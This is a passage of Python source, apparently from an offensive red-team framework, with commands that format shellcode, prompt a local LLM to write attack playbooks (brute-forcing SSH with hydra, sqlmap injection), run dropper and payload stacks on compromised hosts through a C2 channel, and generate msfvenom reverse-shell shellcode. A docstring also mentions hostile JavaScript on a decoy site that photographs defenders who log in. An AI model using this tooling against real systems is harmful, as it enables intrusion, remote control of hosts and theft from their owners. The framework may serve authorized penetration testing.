            return

        try:
            # Clean input: remove non-hex chars and validate
            clean_hex = "".join([c for c in line.strip() if c in "0123456789abcdefABCDEF"])
            if len(clean_hex) % 2 != 0:
                raise ValueError("Invalid hex string length (odd number of characters)")

            # Split into byte array
            byte_list = [f"0x{clean_hex[i:i+2]}" for i in range(0, len(clean_hex), 2)]

            # NASM formatting
            output = ["section .data"]
            output.append("shellcode:")

            # Split into chunks of 16 bytes
            for i in range(0, len(byte_list), 16):
                chunk = byte_list[i:i+16]
                output.append(f"    db {','.join(chunk)}")

            # Add length calculation
            output.append(f"shellcode_len equ $ - shellcode\n")

            self.poutput("\n".join(output))

        except ValueError as ve:
            self.poutput(f"Hex conversion error: {str(ve)}")
        except Exception as e:
            self.poutput(f"Critical error: {str(e)}")

    @cmd2.with_category(post_exploitation_category)
    def do_ai_playbook(self, line):
        """
        Generates an offensive playbook using:
        1. Nmap scan results (CSV)
        2. Custom knowledge base (JSON)
        3. Local LLM analysis (Ollama)

        Usage: ai_playbook <csv_file> [playbook_name] [model_name]
        Example: ai_playbook nmap_results.csv ScepterAttack llama3
        """

        # Parse the command arguments
        args = line.strip().split()

        if not args:
            csv_file = f"sessions/vulns_{self.params.get('rhost', 'unknown')}.csv"
            playbook_name = f"AutoGeneratedPlaybook"
            model_name = "deepseek-r1:1.5b"  # Default model
        elif len(args) == 1:
            csv_file = args[0]
            playbook_name = f"AutoGeneratedPlaybook"
            model_name = "deepseek-r1:1.5b"
        elif len(args) == 2:
            csv_file = args[0]
            playbook_name = args[1]
            model_name = "deepseek-r1:1.5b"
        else:
            csv_file = args[0]
            playbook_name = args[1]
            model_name = args[2]

        try:
            # Validate CSV file existence
            if not os.path.exists(csv_file):
                print_error(f"[!] File not found: {csv_file}")
                return

            # 1. Parse Nmap CSV
            print_msg("[*] Parsing Nmap CSV results...")
            nmap_services = parse_nmap_csv(csv_file)
            if not nmap_services:
                print_warn("[!] No services found in the CSV.")
                return
            print_msg(f"[+] Found {len(nmap_services)} services")

            # 2. Load knowledge base
            print_msg("[*] Loading knowledge base...")
            knowledge_base = load_knowledge_base()
            if not knowledge_base:
                print_warn("[!] Knowledge base is empty.")
            print_msg(f"[+] Loaded {len(knowledge_base)} techniques")

            # 3. Generate structured prompt
            print_msg("[*] Creating prompt for LLM...")
            base_prompt = f"Generate attack plan for target: {os.path.basename(csv_file)}"

            # Use the strict YAML prompt generator
            complex_prompt = self._create_strict_yaml_prompt(
                base_prompt=base_prompt,
                nmap_services=nmap_services,
                knowledge_base=knowledge_base
            )

            # 4. Query LLM model
            print_msg(f"[*] Generating playbook with {model_name}...")

            # Store the prompt for debugging
            debug_dir = "debug"
            os.makedirs(debug_dir, exist_ok=True)
            with open(f"{debug_dir}/prompt_{playbook_name}.txt", "w") as f:
                f.write(complex_prompt)

            # Make multiple attempts if needed
            max_attempts = 3
            response = None

            for attempt in range(1, max_attempts + 1):
                response = query_ollama(complex_prompt, model=model_name)

                if not response:
                    print_error(f"[!] Attempt {attempt}: Failed to get response from Ollama")
                    continue

                # Store last response for debugging
                self._last_llm_response = response

                # Simple validation test
                if response.strip().startswith("apt_name:") or "apt_name:" in response[:100]:
                    print_msg(f"[+] Attempt {attempt}: Got valid-looking YAML response")
                    break
                else:
                    print_warn(f"[!] Attempt {attempt}: Response doesn't look like valid YAML, retrying...")

                    # Add forceful instructions to the prompt for next attempt
                    if attempt < max_attempts:
                        complex_prompt += "\n\nIMPORTANT: YOUR RESPONSE MUST BE PURE YAML ONLY! NO EXPLANATION TEXT!"

            # Save raw response for reference
            raw_file = f"{debug_dir}/raw_{playbook_name}.txt"
            with open(raw_file, "w") as f:
                f.write(response)
            print_msg(f"[*] Raw response saved to {raw_file}")

            # 5. Process response - handle multiple formats
            print_msg("[*] Parsing LLM response...")

            # Pre-process response before YAML parsing
            processed_response = preprocess_llm_response(response)

            # Try to parse YAML
            playbook_data = parse_yaml_response(processed_response)
            if not playbook_data:
                print_error("[!] Failed to parse YAML response")
                print_error("[!] Attempting fallback manual YAML extraction...")

                # Fallback to manual YAML extraction
                playbook_data = manual_yaml_extraction(processed_response)

                if not playbook_data:
                    print_error("[!] All parsing attempts failed")
                    print_msg("[*] You can run 'debug_yaml' to analyze the response")
                    return

            # 6. Save playbook
            print_msg("[*] Saving playbook...")
            playbook_path = save_playbook(playbook_data, playbook_name)
            print_msg(f"[+] Playbook generated: {playbook_path}")

            # 7. Show summary
            print_msg("\n[+] Playbook Summary:")
            print_msg(f"  Name: {playbook_data.get('apt_name', 'Unknown')}")
            print_msg(f"  Description: {playbook_data.get('description', 'No description')[:50]}...")
            print_msg(f"  Steps: {len(playbook_data.get('steps', []))}")

        except Exception as e:
            import traceback
            print_error(f"[!] Unexpected error: {str(e)}")
            print_error(traceback.format_exc())

    def _create_strict_yaml_prompt(self, base_prompt, nmap_services, knowledge_base):
        """
        Create a prompt that strictly enforces YAML response format without any narrative text
        """
        # Contexto dinámico del CSV
        nmap_context = "Services detected during reconnaissance:\n"
        for service, instances in nmap_services.items():
            nmap_context += f"- {service}\n"
            for instance in instances:
                nmap_context += f"   IP: {instance['ip']}, Port: {instance['port']}, Protocol: {instance.get('protocol', 'tcp')}\n"

        # Extraer contexto adicional
        config = {"target": self.params.get("domain", "unknown")}
        tasks = ["Privilege Escalation", "Lateral Movement", "Credential Dumping"]
        operators = [{"name": "Gris"}]

        # YAML template with very explicit formatting guidance
        yaml_template = """apt_name: ShadowBreaker
        description: Targeted attack chain for exposed services
        steps:
        - atomic_id: T1021.001
            name: Remote Services - SSH
            description: Attempt to brute force SSH credentials
            command: hydra -L users.txt -P passwords.txt ssh://192.168.1.1
            service: ssh
            mitre_info:
            mitre_id: T1021.001
            mitre_name: Remote Services - SSH
        - atomic_id: T1190
            name: Exploit Public-Facing Application
            description: Exploit vulnerability in web application
            command: sqlmap -u http://192.168.1.1/login.php --forms --batch
            service: http
            mitre_info:
            mitre_id: T1190
            mitre_name: Exploit Public-Facing Application""".replace("        ","")

        # Construir el prompt final con instrucciones YAML explícitas
        return f"""
        You are a red team planner tasked with creating ATTACK PLAYBOOKS in YAML format.

        INSTRUCTIONS:
        1. Analyze the target environment below
        2. Generate ATTACK STEPS based on the services detected
        3. Format your ENTIRE response as a YAML document
        4. DO NOT include any explanatory text, thinking, or markdown formatting
        5. ONLY OUTPUT VALID YAML

        THE OUTPUT MUST BE VALID YAML with this exact structure:
        apt_name: [attack name]
        description: [short description]
        steps:
        - atomic_id: [technique id]
            name: [technique name]
            description: [brief description]
            command: [executable command]
            service: [associated service]
            mitre_info:
            mitre_id: [MITRE ATT&CK ID]
            mitre_name: [MITRE technique name]
        - [next step...]

        TARGET ENVIRONMENT:
        {base_prompt}

        {nmap_context}

        Example of valid output format:
        {yaml_template}

        DO NOT INCLUDE ANY TEXT BEFORE OR AFTER THE YAML CONTENT.
        DO NOT INCLUDE ```yaml or ``` MARKERS.
        NEVER USE <think> TAGS.
        YOUR COMPLETE RESPONSE MUST BE VALID YAML AND NOTHING ELSE.
        """.strip().replace("        ","")

    @cmd2.with_category(post_exploitation_category)
    def do_create_synthetic(self, line):
        """
        Create a basic synthetic playbook from Nmap CSV when LLM fails.

        Usage: create_synthetic <csv_file> [playbook_name]
        Example: create_synthetic nmap_results.csv SyntheticPlaybook
        """
        args = line.strip().split()

        if not args:
            print_error("[!] Missing CSV file path")
            print_msg("[*] Usage: create_synthetic <csv_file> [playbook_name]")
            return

        csv_file = args[0]
        playbook_name = args[1] if len(args) > 1 else "SyntheticPlaybook"

        if not os.path.exists(csv_file):
            print_error(f"[!] File not found: {csv_file}")
            return

        try:
            print_msg(f"[*] Creating synthetic playbook from {csv_file}...")

            # Parse the Nmap CSV
            nmap_services = parse_nmap_csv(csv_file)
            if not nmap_services:
                print_error("[!] No services found in the CSV")
                return

            print_msg(f"[+] Found {len(nmap_services)} services")

            # Create synthetic playbook
            playbook_data = create_synthetic_yaml(nmap_services)

            # Save the playbook
            playbook_path = save_playbook(playbook_data, playbook_name)
            print_msg(f"[+] Synthetic playbook saved to: {playbook_path}")

            # Show summary
            print_msg("\n[+] Synthetic Playbook Summary:")
            print_msg(f"  Name: {playbook_data.get('apt_name', 'Unknown')}")
            print_msg(f"  Description: {playbook_data.get('description', 'No description')}")
            print_msg(f"  Steps: {len(playbook_data.get('steps', []))}")

        except Exception as e:
            import traceback
            print_error(f"[!] Error creating synthetic playbook: {str(e)}")
            print_error(traceback.format_exc())

    @cmd2.with_category(post_exploitation_category)
    def do_extract_yaml(self, line):
        """
        Extract YAML from an existing debug file and try to create a playbook.

        Usage: extract_yaml <debug_file> [playbook_name]
        Example: extract_yaml debug_AutoGeneratedPlaybook.txt MyPlaybook
        """
        args = line.strip().split()

        if not args:
            print_error("[!] Missing debug file path")
            print_msg("[*] Usage: extract_yaml <debug_file> [playbook_name]")
            return

        debug_file = args[0]
        playbook_name = args[1] if len(args) > 1 else "ExtractedPlaybook"

        if not os.path.exists(debug_file):
            print_error(f"[!] File not found: {debug_file}")
            return

        try:
            print_msg(f"[*] Attempting to extract YAML from {debug_file}...")

            # Read the debug file
            with open(debug_file, 'r') as f:
                content = f.read()

            # Try to extract useful YAML content
            print_msg("[*] Pre-processing content...")
            processed_content = preprocess_llm_response(content)

            # First try normal YAML parsing
            playbook_data = parse_yaml_response(processed_content)

            # If that fails, try manual extraction
            if not playbook_data:
                print_warn("[!] Standard YAML parsing failed, trying manual extraction...")
                playbook_data = manual_yaml_extraction(processed_content)

            if not playbook_data:
                print_error("[!] All extraction methods failed")
                return

            # Save the extracted playbook
            print_msg("[*] Saving extracted playbook...")
            playbook_path = save_playbook(playbook_data, playbook_name)
            print_msg(f"[+] Playbook saved to: {playbook_path}")

            # Show summary
            print_msg("\n[+] Extracted Playbook Summary:")
            print_msg(f"  Name: {playbook_data.get('apt_name', 'Unknown')}")
            print_msg(f"  Description: {playbook_data.get('description', 'No description')[:50]}...")
            print_msg(f"  Steps: {len(playbook_data.get('steps', []))}")

        except Exception as e:
            import traceback
            print_error(f"[!] Error during extraction: {str(e)}")
            print_error(traceback.format_exc())

    @cmd2.with_category(reporting_category)
    def do_img2vid(self, line):
        """
        Generates an MP4 video from PNG images found in the sessions/captured_images directory.
        This images are generated by the ofensive js code in the decoy site (When the blueteam try to visit our c2 and success login).

        The images are expected to have filenames in the format: capture_YYYYMMDD_HHMMSS.png.
        The video will be created in the current working directory as 'output.mp4'.
        Requires ffmpeg to be installed and accessible in the system's PATH.
        """
        if not os.path.isdir(self.captured_images_dir):
            print_error(f"Error: Directory not found: {self.captured_images_dir}")
            return

        image_files = sorted(glob.glob(os.path.join(self.captured_images_dir, 'capture_*.png')))

        if not image_files:
            print_error("No PNG images found in the captured images directory.")
            return

        num_images = len(image_files)
        frame_rate = 1
        duration = num_images / frame_rate
        fade_out_start = max(0, duration - 1)

        try:
            ffmpeg_cmd = [
                'ffmpeg',
                '-framerate', str(frame_rate),
                '-pattern_type', 'glob',
                '-i', os.path.join(self.captured_images_dir, 'capture_*.png'),
                '-vf', f'fade=in:st=0:d=1,fade=out:st={fade_out_start}:d=1',
                '-r', '30', # Output frame rate
                '-c:v', 'libx264',
                '-pix_fmt', 'yuv420p',
                '-y',  # Overwrite output file if it exists
                self.captured_images_dir + '/output.mp4'
            ]
            subprocess.run(ffmpeg_cmd, check=True, capture_output=True)
            print_msg("Video "+ self.captured_images_dir + '/output.mp4' + " created successfully.")
        except FileNotFoundError:
            print_error("Error: ffmpeg command not found. Please ensure it is installed and in your system's PATH.")
        except subprocess.CalledProcessError as e:
            print_error(f"Error creating video: {e}")
            print_error(f"FFmpeg output (stderr):\n{e.stderr.decode()}")
        except Exception as e:
            print_error(f"An unexpected error occurred: {e}")

    @cmd2.with_category(post_exploitation_category)
    def do_convert_remcomsvc_from_file(self, arg):
        """Converts the Python REMCOMSVC byte string from remcomsvc.py to Golang byte slice format, prints a sample, and saves it to sessions/remcomsvc.go. see lazyaddon GoPEInjection
        Usage: convert_remcomsvc_from_file
        Return: Converts the Python REMCOMSVC byte string from remcomsvc.py to Golang byte slice format, prints a sample, and saves it to sessions/remcomsvc.go.
        """
        sys.path.append('./env/lib/python3.12/site-packages/impacket/examples')
        import remcomsvc

        remcomsvc_python_bytes = remcomsvc.REMCOMSVC

        golang_escaped_string = ""
        for byte in remcomsvc_python_bytes:
            golang_escaped_string += f"\\x{byte:02x}"

        golang_declaration = f"var REMCOMSVC = \"{golang_escaped_string}\""

        print_msg("RemCosSVC Golang (escaped string):")
        sample = golang_declaration[:min(200, len(golang_declaration))]  # Mostrar los primeros 200 caracteres como muestra
        print_msg(sample + ("..." if len(golang_declaration) > 200 else ""))

        sessions_dir = 'sessions'
        os.makedirs(sessions_dir, exist_ok=True)
        filepath = os.path.join(sessions_dir, 'remcomsvc.go')

        try:
            with open(filepath, 'w') as f:
                f.write(f"package main\n\n{golang_declaration}\n")
            print_msg(f"File saved in: {filepath}")
        except Exception as e:
            print_error(f"Error saving the file: {e}")

    @cmd2.with_category(reporting_category)
    def do_process_scans(self, line):
        """
        Processes CSV files with scan results and vulnerability data to generate a Shodan-like JSON database.

        Args:
            arg (Namespace): Arguments parsed by cmd2. Includes:
                directory (str, positional): The directory containing the CSV files.

        Returns:
            None

        Output:
            A JSON file named 'surface_attack.json' in the specified directory containing the processed data.
        """

        all_data = {
            "hosts": [],
            "services": [],
            "vulnerabilities": [],

        }
        processed_ips = set()


        scan_files = glob.glob(os.path.join(self.sessions_dir, "scan_*.csv"))
        for scan_file in scan_files:
            match = re.match(r"scan_([^_]+)_(\d+).csv", os.path.basename(scan_file))
            if match:
                ip = match.group(1)
                port = int(match.group(2))
                self.process_scan_csv(scan_file, ip, port, all_data, processed_ips)
            elif match := re.match(r"scan_([^_]+)\.csv", os.path.basename(scan_file)):
                ip = match.group(1)
                self.process_scan_csv(scan_file, ip, None, all_data, processed_ips)
            elif match := re.match(r"scan_discovery_([^_]+)_(\d+)\.csv", os.path.basename(scan_file)):
                ip = match.group(1)
                port = int(match.group(2))
                self.process_scan_csv(scan_file, ip, port, all_data, processed_ips)
            elif match := re.match(r"scan_discovery_([^_]+)\.csv", os.path.basename(scan_file)):
                ip = match.group(1)
                self.process_scan_csv(scan_file, ip, None, all_data, processed_ips)


        vuln_files = glob.glob(os.path.join(self.sessions_dir, "vulns_*.csv"))
        for vuln_file in vuln_files:
            match = re.match(r"vulns_([^_]+).csv", os.path.basename(vuln_file))
            if match:
                ip = match.group(1)
                self.process_vuln_csv(vuln_file, ip, all_data, processed_ips)

        output_file = os.path.join(self.sessions_dir, "surface_attack.json")
        with open(output_file, 'w') as f:
            json.dump(all_data, f, indent=2)
        print_msg(f"Processed CSV files and saved data to '{output_file}'.")

    def process_scan_csv(self, csv_file, ip, port, all_data, processed_ips):
        """Processes a single scan CSV file."""
        with open(csv_file, 'r', newline='') as infile:
            reader = csv.DictReader(infile, delimiter=';')
            for row in reader:
                host_entry = next((h for h in all_data['hosts'] if h['ip'] == ip), None)
                if host_entry is None:
                    host_entry = {"ip": ip, "hostnames": [row.get("FQDN", "")], "ports": []}
                    all_data['hosts'].append(host_entry)
                    processed_ips.add(ip)
                if port is not None and port not in host_entry['ports']:
                    host_entry['ports'].append(port)

                service_entry = {
                    "ip": ip,
                    "port": int(row['PORT']) if row['PORT'] else port,
                    "protocol": row['PROTOCOL'],
                    "service": row['SERVICE'],
                    "version": row['VERSION']
                }
                if service_entry not in all_data['services']:
                    all_data['services'].append(service_entry)

    def process_vuln_csv(self, csv_file, ip, all_data, processed_ips):
        """Processes a single vulnerability CSV file."""
        with open(csv_file, 'r', newline='') as infile:
            reader = csv.DictReader(infile, delimiter=';')
            for row in reader:
                service_entry = {
                    "ip": ip,
                    "port": int(row['PORT']) if row['PORT'] else None,
                    "protocol": row['PROTOCOL'],
                    "service": row['SERVICE'],
                    "version": row['VERSION']
                }

                found_service = next((s for s in all_data['services'] if
                                    s['ip'] == service_entry['ip'] and
                                    s['port'] == service_entry['port'] and
                                    s['protocol'] == service_entry['protocol'] and
                                    s['service'] == service_entry['service'] and
                                    s['version'] == service_entry['version']), None)
                if not found_service:
                    all_data['services'].append(service_entry)

                vulnerability_entry = {
                    "ip": ip,
                    "port": int(row['PORT']) if row['PORT'] else None,
                    "protocol": row['PROTOCOL'],
                    "service": row['SERVICE'],
                    "version": row['VERSION']
                }


                found_service_for_vuln = next((s for s in all_data['services'] if
                                               s['ip'] == vulnerability_entry['ip'] and
                                               s['port'] == vulnerability_entry['port'] and
                                               s['protocol'] == vulnerability_entry['protocol'] and
                                               s['service'] == vulnerability_entry['service'] and
                                               s['version'] == vulnerability_entry['version']), None)
                if found_service_for_vuln:
                    if "vulnerabilities" not in found_service_for_vuln:
                        found_service_for_vuln["vulnerabilities"] = []

                    vuln_id = f"{ip}:{row['PORT']}:{row['SERVICE']}"
                    if vuln_id not in [v['id'] for v in found_service_for_vuln["vulnerabilities"] if 'id' in v]:
                        found_service_for_vuln["vulnerabilities"].append({"id": vuln_id, "description": "Known vulnerability (inferred from filename)"})

    @cmd2.with_category(post_exploitation_category)
    def do_adversary_yaml(self, line):
        """
        Execute adversary from YAML in lazyadversaries/*.yaml
        Syntax: adversary [id] [l|r|n]
        """
        path = self.path
        adversaries = self._load_adversaries()

        with open(f"{path}/sessions/key.aes", 'rb') as f:
            AES_KEY_hex = f.read().hex()

        id_adversary, confirm = self._parse_adversary_args(line)
        adversary = next((adv for adv in adversaries if adv['id'] == int(id_adversary)), None)

        if not adversary:
            print_error(f"No adversary found with id {id_adversary}")
            return

        replacements = {
            "output_path": adversary["output_path"],
            "binary": adversary["binary"],
            "path_src": adversary["path_src"],
            "name": adversary["name"],
            "target_path": adversary["target_path"],
            "pid": adversary.get("pid", ""),
            "param": adversary.get("param", ""),
            "shellcode": adversary.get("shellcode", ""),
            "lhost": self.params["lhost"],
            "username": self.params["lhost"],
            "line": self.c2_clientid,
            "user_agent_1": f"{user_agent_1}",
            "user_agent_2": f"{user_agent_2}",
            "user_agent_3": f"{user_agent_3}",
            "url_trafic_1": f"{url_trafic_1}",
            "url_trafic_2": f"{url_trafic_2}",
            "url_trafic_3": f"{url_trafic_3}",
            "{stealth}": "True",
        }
        replacements.update({
            "lport": self.params["lport"],
            "username": self.params["c2_user"],
            "password": self.params["c2_pass"],
            "platform": adversary["target_os"],
            "sleep": str(adversary["sleep"]),
            "maleable": self.params["c2_maleable_route"],
            "useragent": self.params["user_agent_lin"] if adversary["target_os"] == "linux" else self.params["user_agent_win"],
            "key": AES_KEY_hex
        })
        command = replace_placeholders(adversary["command"], replacements)
        if adversary.get("encoder") == "base64":
            replacements["base64_command"] = base64.b64encode(command.encode()).decode()
        if adversary.get("replace_command"):
            replace_command = replace_placeholders(adversary.get("replace_command"), replacements)
            self.cmd(replace_command)
        if adversary.get("compile"):
            compile = replace_placeholders(adversary.get("compile"), replacements)
            self.cmd(compile)


        self._patch_template_if_needed(adversary, path, replacements)

        commands = self._build_command_stack(adversary, replacements)
        self._display_adversary_info(adversary, commands)

        if not confirm:
            confirm = input("Execute stack? (l)ocal, (r)emote, (n)o: ").strip().lower() or 'n'

        self._execute_commands(confirm, commands['remote'])

        output_filename = f"output_{adversary['name']}.txt"
        remote_output_path = os.path.join(adversary['target_path'], output_filename)
        local_output_path = os.path.join(path, "sessions", "uploads", output_filename)

        if confirm == 'l':
            subprocess.run(f"cp {remote_output_path} {local_output_path}", shell=True)
            for file in glob.glob(f"{path}/sessions/uploads/*"):
                self.upload_file_to_c2(file, self.c2_clientid)
        elif confirm == 'r':
            self.issue_command_to_c2(f"upload:{output_filename}", self.c2_clientid)
            self.download_file_from_c2(output_filename, self.c2_clientid)

    def _load_adversaries(self):
        adversaries = []
        for file in glob.glob("lazyadversaries/*.yaml"):
            with open(file, 'r') as f:
                try:
                    data = yaml.safe_load(f)
                    if isinstance(data, list):
                        adversaries.extend(data)
                    elif isinstance(data, dict):
                        adversaries.append(data)
                except Exception as e:
                    print_error(f"Error loading {file}: {e}")
        return adversaries

    def _parse_adversary_args(self, line):
        args = line.split()
        if len(args) == 2:
            return args[0], args[1]
        elif len(args) == 1:
            return args[0], None
        else:
            return input("Enter ID: "), None

    def _patch_template_if_needed(self, adversary, path, replacements):
        template_path = os.path.join(path, adversary['output_path'], adversary['name'])
        if os.path.exists(template_path):
            with open(template_path, 'r') as f:
                content = f.read()
                for key, val in replacements.items():
                    content = content.replace(f"{{{key}}}", str(val))
            with open(template_path, 'w') as f:
                f.write(content)

    def _build_command_stack(self, adversary, r):
        return {
            'local': [
                replace_placeholders(adversary['copy_command'], r),
                replace_placeholders(adversary['replace_command'].replace("[shellcode]", "{shellcode}"), r),
                replace_placeholders(adversary['compile'], r),
            ],
            'remote': [
                replace_placeholders(adversary['droper'], r),
                replace_placeholders(adversary['payload'], r),
                replace_placeholders(adversary['clean_cmd'], r),
            ],
        }

    def _display_adversary_info(self, adversary, commands):
        print_msg(f"Id: {adversary['id']}")
        print_msg(f"Name: {adversary['name']}")
        print_msg(f"Technique: {adversary['technique_name']}")
        print_msg(f"Target OS: {adversary['target_os']}")
        print_msg(f"Encoded Cmd: {commands['remote'][1]}")

    def _execute_commands(self, confirm, remote_cmds):
        if confirm == 'l':
            for cmd in remote_cmds:
                self.display_toastr(cmd)
                subprocess.run(cmd + " 2>/dev/null", shell=True)
                time.sleep(1)
        elif confirm == 'r':
            for cmd in remote_cmds:
                self.issue_command_to_c2(cmd, self.c2_clientid)
                time.sleep(1)
        else:
            for cmd in remote_cmds:
                subprocess.Popen(['xclip', '-selection', 'clipboard'], stdin=subprocess.PIPE).communicate(input=cmd.encode())
                print_msg(f"Command copied: {cmd}")
            print_warn("Execution cancelled.")



    @with_argparser(create_msfshellcoder_parser())
    @with_category(post_exploitation_category)
    def do_msfshellcoder(self, line):
        """
        Generate shellcode in C format using msfvenom for either a custom command or a reverse shell payload.
        This command supports both direct argument input and interactive mode. It uses self.params for default
        values (lhost, lport, etc). Output is saved to sessions/ as a .txt file in C array format.
        Args:
            --payload (-p): MSF payload (e.g., windows/x64/meterpreter/reverse_tcp).
            --command (-c): Custom command to encode into shellcode (e.g., 'whoami').
            --lhost (-H): Local IP for reverse shells.
            --lport (-P): Local port for reverse shells.
            --os (-o): Target OS: 'windows' or 'linux'.
            --arch: Target architecture: 'x86' or 'x64' (default: x64).
        Outputs:
            Saves shellcode to ./sessions/shellcode_*.txt in C format.
            Uses self.cmd() to run system commands and self.display_toastr() for UI feedback.
        Examples:
            msfshellcoder -c "calc.exe" --os windows
            msfshellcoder -p linux/x64/shell_reverse_tcp -H 10.0.0.5 -P 4444
            msfshellcoder  # Launch interactive mode
        """
        # Check if msfvenom is available
        if not is_binary_present("msfvenom"):
            self.display_toastr("msfvenom not found. Installing Metasploit Framework...", type="warning")
            self.cmd("sudo apt-get update -y")
            self.cmd("sudo apt-get install -y metasploit-framework")
            if not is_binary_present("msfvenom"):
                self.display_toastr("msfvenom installation failed. Aborting.", type="error")
                return


        args = line

        if not line:
            self.display_toastr("No arguments provided. Switching to interactive mode.", type="info")
            choice = input("Generate (1) reverse shell or (2) custom command? [1/2]: ").strip()
            if choice == "2":
                cmd_input = input("Enter command to shellcode: ").strip()
                target_os = input("Target OS (windows/linux): ").strip().lower()
                arch = input("Architecture (x86/x64) [x64]: ").strip() or "x64"
                lhost = input(f"LHOST [{self.params['lhost']}]: ").strip() or self.params['lhost']
                lport = input(f"LPORT [{self.params['lport']}]: ").strip() or self.params['lport']
                try:
                    lport = int(lport)
                except ValueError:
                    lport = self.params['lport']
                args.command = cmd_input
                args.os = target_os
                args.arch = arch
                args.lhost = lhost
                args.lport = lport
                args.payload = None
            else:
                args.payload = input(f"Payload (default: windows/x64/meterpreter/reverse_tcp): ").strip()
                args.lhost = input(f"LHOST [{self.params['lhost']}]: ").strip() or self.params['lhost']
                args.lport = input(f"LPORT [{self.params['lport']}]: ").strip() or self.params['lport']
                try:
                    args.lport = int(args.lport)
                except ValueError:
                    args.lport = self.params['lport']
                if not args.payload:
                    args.payload = "windows/x64/meterpreter/reverse_tcp"
        else:
            # Use defaults from params if not provided
            args.lhost = args.lhost or self.params['lhost']
            args.lport = args.lport or self.params['lport']
            if not args.lport:
                self.display_toastr("LPORT is required.", type="error")
                return

        # Create sessions directory
        self.cmd("mkdir -p sessions")

        # Build payload based on input
        if args.command:
            if not args.os:
                self.display_toastr("OS is required when using --command.", type="error")
                return

            os_key = "win" if args.os.startswith("win") else "lin"
            arch_flag = "x86" if args.arch == "x86" else "x64"

            if os_key == "win":
                if args.arch == "x86":
                    payload = "windows/exec"
                    cmd_opt = f"CMD={args.command}"
                else:
                    payload = "windows/x64/exec"
                    cmd_opt = f"CMD={args.command}"
            else:  # linux
                payload = "cmd/unix/reverse_bash" if "reverse" in args.command else "cmd/unix/generic"
                if "reverse" in args.command:
                    # Assume it's a reverse shell command
                    cmd_opt = ""
                else:
                    cmd_opt = f"CMD={args.command}"

            # Build msfvenom command
            if os_key == "win" and "exec" in payload:
                msf_cmd = f'msfvenom -p {payload} {cmd_opt} -f c -o sessions/shellcode_cmd_{args.os}_{args.arch}.txt'
            else:
                # For bash or generic commands
                msf_cmd = f'msfvenom -p {payload} LHOST={args.lhost} LPORT={args.lport} -f c -o sessions/shellcode_cmd_{args.os}_{args.arch}.txt'

            output_file = f"sessions/shellcode_cmd_{args.os}_{args.arch}.txt"
            desc = f"Custom command: {args.command[:50]}..."

        elif args.payload:
            payload = args.payload
            msf_cmd = f'msfvenom -p {payload} LHOST={args.lhost} LPORT={args.lport} -f c -o sessions/shellcode_{payload.replace("/", "_")}_{args.lhost}_{args.lport}.txt'
            output_file = f"sessions/shellcode_{payload.replace('/', '_')}_{args.lhost}_{args.lport}.txt"
            desc = f"Reverse shell: {payload}"
        else:
            self.display_toastr("Either --payload or --command is required.", type="error")
            return

        # Execute msfvenom
        self.display_toastr(f"Generating shellcode: {desc}", type="info")
        self.cmd(msf_cmd)

        # Verify and notify
        if os.path.exists(output_file):
            self.display_toastr(f"Shellcode successfully generated: {output_file}", type="info")
        else:
            self.display_toastr(f"Failed to generate shellcode. Check msfvenom output.", type="error")


    def do_pop(self, line):
        """
        Open a centered popup in the current tmux session to execute a shell command.

        If no command is provided via argument, prompts the user interactively.
        The popup remains open after command execution and waits for user acknowledgment
        via pressing ENTER, avoiding premature closure without requiring fixed sleep delays.

        Requirements:
        - Must be run inside an active tmux session (TMUX environment variable set).
        - Tmux server must be running.

        The command is executed in a bash shell within the popup. If tmux is not available
        or the environment is invalid, an error message is displayed and execution aborts.

        Args:
            line (str): The command to execute in the popup. If empty, prompts user input.
        """
        if not line:
            line = input("    [!] Enter command: ") or 'whoami'

        if 'TMUX' not in os.environ:
            self.display_toastr("[!] Error: Not inside a tmux session.", type="error")
            self.display_toastr("    [💡] Hint: Run this inside a tmux session (e.g. `v` or `h`).", type="info")
            return

        try:
            subprocess.run(['tmux', 'list-sessions'], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except (subprocess.CalledProcessError, FileNotFoundError):
            self.display_toastr("    [!] Error: Tmux server not running or tmux not installed.", type="error")
            return

        cmd = f"""tmux popup -w 80% -h 60% -x C -y C -E 'bash -c \"{line} ; sleep 3\"'"""
        self.cmd(cmd)
        return

def main():
    p = LazyOwnShell()
    p.load_yaml_plugins()
    try:
        p.onecmd("check_update")
        p.onecmd("graph")
    except Exception as e:
        print_error(f"Error: {e}")


    old = False
    if arguments:
        if arg.startswith("-c"):
            if len(arguments) == 2:
                cmd = arguments[1]
                os.system(
                    'ip a show scope global | awk \'/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }\''
                )
                p.onecmd('ipp')
                p.onecmd("p")
                p.onecmd(cmd)
                p.cmdloop()
            else:
                print_error("you must pass the comand to execute ex; ./run -c ping")
                sys.exit(2)
        if arg.startswith("-p"):
            if len(arguments) == 2:
                payload = arguments[1]
                os.system(
                    'ip a show scope global | awk \'/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }\''
                )
                p.onecmd(f'payload {payload}')
                p.onecmd('ipp')
        if arg.startswith("--old-banner"):
            old = True

    if NOBANNER is False:
        if not old:
            os.system("python3 banner.py")
        print(
            f"    {RED}{BANNER}{MAGENTA}{BOLD}Autor: {CYAN}{BOLD}{BG_RED}grisUN0{RESET}"
        )

    else:
        p.onecmd("rhost clean")
    p.onecmd('p')
    p.onecmd('ipp')
    p.onecmd("createcredentials")
    p.cmdloop()


if __name__ == "__main__":
    main()